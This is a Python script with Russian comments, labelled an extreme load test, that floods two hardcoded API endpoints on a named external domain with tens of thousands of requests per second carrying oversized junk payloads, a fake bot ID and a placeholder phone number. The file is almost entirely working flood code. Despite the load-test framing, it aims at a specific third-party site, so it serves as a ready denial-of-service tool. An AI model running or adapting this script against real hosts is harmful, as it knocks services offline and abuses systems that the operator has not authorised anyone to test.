#!/usr/bin/env python3
"""
ЭКСТРЕМАЛЬНЫЙ НАГРУЗОЧНЫЙ ТЕСТ – может положить ваш ПК.
Запуск: python kill_my_server.py
"""
import asyncio
import aiohttp
import json
import os
import time
import random
import signal
import multiprocessing
from datetime import datetime
from collections import defaultdict

# ========== УЛЬТРА-АГРЕССИВНЫЕ НАСТРОЙКИ ==========
TARGET_URL = "https://jameteam.com/portals/api/log"
TARGET_URL2 = "https://jameteam.com/portals/api/browser_auth_sta"

# Забиваем все возможные ядра CPU
CPU_CORES = multiprocessing.cpu_count()
RPS_TARGET = int(os.getenv("RPS_TARGET", "20000"))   # 20k RPS – старт
WORKERS_PER_CORE = int(os.getenv("WORKERS_PER_CORE", "20"))  # 20 воркеров на ядро
MAX_WORKERS = CPU_CORES * WORKERS_PER_CORE            # например, на 8 ядрах = 160 воркеров
DURATION = int(os.getenv("DURATION_SECONDS", "60"))   # по умолчанию 60 секунд ада
TIMEOUT = int(os.getenv("TIMEOUT", "1"))              # 1 секунда – не ждём

# Оба payload'а (без задержек)
PAYLOAD1 = {"action": "app_opened", "bot_id": "3308", "initData": "x"*5000, "user": {}}
PAYLOAD2 = {"bot_id": "3308", "initData": "x"*5000, "phone": "+79999999999", "user": {}}

HEADERS = {"Content-Type": "application/json", "Connection": "keep-alive"}

# Глобальные счётчики (без синхронизации – для скорости)
total = 0
success = 0
failed = 0
running = True

def get_payload():
    return PAYLOAD1 if random.random() < 0.5 else PAYLOAD2

async def send(session, req_id):
    global total, success, failed
    try:
        async with session.post(TARGET_URL if random.random()<0.5 else TARGET_URL2,
                                json=get_payload(), headers=HEADERS, timeout=TIMEOUT) as resp:
            total += 1
            if resp.status == 200:
                success += 1
            else:
                failed += 1
            # НЕ выводим ничего, чтобы не тратить время
    except:
        total += 1
        failed += 1

async def worker(session, rate):
    interval = 1.0 / rate
    next_time = time.perf_counter()
    while running:
        next_time += interval
        await send(session, 0)
        sleep = next_time - time.perf_counter()
        if sleep > 0:
            await asyncio.sleep(sleep)

async def main():
    global running
    print("🔥🔥🔥 ЗАПУСК УЛЬТРА-НАГРУЗКИ 🔥🔥🔥")
    print(f"Ядер CPU: {CPU_CORES}")
    print(f"Воркеров: {MAX_WORKERS}")
    print(f"Целевой RPS: {RPS_TARGET}")
    print(f"Длительность: {DURATION} сек. (Ctrl+C для остановки)")
    print("⚠️  Ваш компьютер может зависнуть!")
    connector = aiohttp.TCPConnector(limit=MAX_WORKERS*2, force_close=True)
    timeout = aiohttp.ClientTimeout(total=TIMEOUT, connect=TIMEOUT)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        workers_cnt = MAX_WORKERS
        rate_per_worker = RPS_TARGET / workers_cnt
        tasks = [asyncio.create_task(worker(session, rate_per_worker)) for _ in range(workers_cnt)]
        await asyncio.sleep(DURATION)
        running = False
        await asyncio.gather(*tasks, return_exceptions=True)
    print(f"\nГотово. Всего запросов: {total}, успех: {success}, ошибок: {failed}")

if __name__ == "__main__":
    asyncio.run(main())
